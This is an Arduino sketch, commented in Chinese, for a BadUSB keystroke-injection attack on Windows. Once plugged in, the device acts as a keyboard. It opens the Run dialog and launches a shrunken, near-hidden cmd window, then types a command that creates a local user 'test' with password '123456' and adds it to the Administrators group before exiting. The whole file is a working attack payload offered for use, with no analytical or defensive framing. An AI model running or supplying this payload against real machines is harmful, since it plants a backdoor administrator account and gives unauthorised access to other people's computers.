#include <Keyboard.h>

void setup() {
  // 这里执行一次
  Keyboard.begin();//开始键盘通讯 
  delay(2000);//初始化时间
  Keyboard.press(KEY_LEFT_GUI); //点击win键
  delay(50); //延迟执行时间
  Keyboard.press('r'); //点击r键
  delay(50);
  Keyboard.release(KEY_LEFT_GUI); //释放win键
  Keyboard.release('r'); //释放r键
  delay(50);
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"); //打开cmd并将串口最小化
  delay(100);
  Keyboard.press(KEY_RETURN); //回车
  Keyboard.release(KEY_RETURN); //释放回车
  delay(50);
  Keyboard.println("net user test 123456 /add&net localgroup Administrators test /add"); //添加test用户
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.println("exit");
  delay(50);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();//结束键盘通讯 
}
 
void loop() {
  // 这里循环执行
 
}